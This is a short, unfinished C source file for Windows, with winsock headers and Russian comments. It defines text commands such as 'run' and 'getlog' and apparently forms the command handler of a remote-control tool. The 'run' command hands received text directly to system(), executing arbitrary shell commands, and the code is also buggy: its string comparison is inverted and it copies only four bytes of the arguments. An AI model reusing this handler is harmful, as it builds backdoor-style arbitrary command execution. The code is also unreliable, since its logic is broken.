#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h> 
#include <stdio.h>
#include <string.h>
#include <locale.h>
// commands
#define CommandRun "run " // for starting cmd commands
#define CommandGetLog "getlog "
 
char *CommandStatus; 

int equals(char *_Str1, char *_Str2) {
    if (strncmp(_Str1, _Str2, strlen(_Str2))) {
        return 1;
    }
    return 0;
}

void CommandRunFunc(char *args) {
    system(args);
}


void ProcessCommandsFunc(char *commhead, char *args, char *buffer) {
    printf("%s", buffer);
    if (equals(commhead, CommandRun) == 1) {
        strncpy(args, buffer + strlen(CommandRun), strlen(CommandRun));
        CommandRunFunc(args);
        CommandStatus = "Command RUN...";
    }



    else {
        CommandStatus = "Commands not found...";
    }
}

// int main() {
//     Command comm = {"run", "dir"};    
//     ProcessCommandsFunc(comm.head, comm.args);
//     printf("%s", CommandStatus);
//     return 0;
// }

/* проверка команд через if else(возможно заменять команды числами, чтобы проще сравнивать)

используем strok чтобы разделить команду на части (либо написать свою библиотеку для работы с командами)*/